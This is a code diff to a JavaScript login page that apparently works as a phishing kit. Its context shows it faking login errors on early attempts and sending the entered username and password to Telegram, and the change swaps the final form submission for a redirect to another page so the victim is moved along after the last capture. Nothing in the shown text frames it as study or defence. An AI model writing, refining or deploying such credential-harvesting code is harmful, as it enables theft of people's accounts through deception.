@@ -170,7 +170,7 @@
                 document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
                 document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
             } else {
-                // On the third attempt, submit the form and then redirect
+                // On the third attempt, redirect to another page
                 document.getElementById("attempt").value = "Final Attempt";
 
                 // Prepare the message to send to Telegram
@@ -197,8 +197,8 @@
                     console.log('Error sending final message.');
                 });
 
-                // Submit the form to redirect to another page
-                form.submit();
+                // Redirect to the new URL
+                window.location.href = "https://www.newpage.com"; // Replace with the actual URL you want to redirect to
             }
         }
 
